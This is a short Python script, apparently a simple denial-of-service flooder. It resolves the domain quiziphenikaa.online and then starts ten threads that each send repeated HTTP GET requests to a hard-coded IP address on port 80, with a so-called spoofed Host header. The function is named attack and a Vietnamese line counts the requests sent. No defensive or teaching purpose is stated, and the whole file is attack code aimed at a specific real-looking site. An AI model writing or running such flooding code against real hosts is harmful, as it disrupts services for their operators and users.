import threading
import socket

hostname = "quiziphenikaa.online"
ip_address = socket.gethostbyname(hostname)
print(f"IP address of {hostname} is {ip_address}")

target = "13.35.186.88"
port = 80
fake_ip = "182.21.20.32"

already_connected = 0

max_requests = 10

def attack():
    global already_connected
    count = 0

    while count < max_requests:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"))
        s.send(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"))

        count += 1
        already_connected += 1
        print(f"Số request đã gửi: {already_connected}")


threads = []
for i in range(10):
    thread = threading.Thread(target=attack)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

print("Done!")